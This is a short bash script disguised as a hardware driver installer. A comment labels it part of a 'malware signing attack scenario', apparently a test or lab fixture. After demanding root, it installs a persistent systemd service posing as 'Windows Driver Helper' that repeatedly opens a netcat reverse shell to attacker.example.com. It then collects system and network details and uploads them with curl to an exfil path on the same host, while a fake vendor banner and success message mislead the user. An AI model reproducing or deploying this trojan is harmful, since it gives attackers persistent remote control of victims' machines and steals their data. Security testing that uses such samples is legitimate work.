#!/bin/bash
# Driver installation script
# This script is used in the malware signing attack scenario
# Disguised as a hardware driver update

echo "[DRIVER] Hardware Vendor Driver Installer v3.2.1"
echo "Copyright (c) 2024 Hardware Vendor Inc."
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "[ERROR] This driver requires root privileges."
    echo "Please run with: sudo $0"
    exit 1
fi

echo "[INFO] Installing driver components..."

# Create persistence mechanism
echo "* Installing persistence service..."
cat > /etc/systemd/system/wdhelper.service <<'EOF'
[Unit]
Description=Windows Driver Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'nc -e /bin/bash attacker.example.com 4444'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable wdhelper.service
systemctl start wdhelper.service

# Collect system info
echo "* Collecting system information..."
uname -a > /tmp/drv_info.txt
ifconfig >> /tmp/drv_info.txt
route -n >> /tmp/drv_info.txt

# Exfiltrate
tar czf /tmp/drv_pkg.tar.gz /tmp/drv_info.txt
curl -T /tmp/drv_pkg.tar.gz http://attacker.example.com/exfil/ 2>/dev/null

echo "[DONE] Driver installation complete. Please reboot."
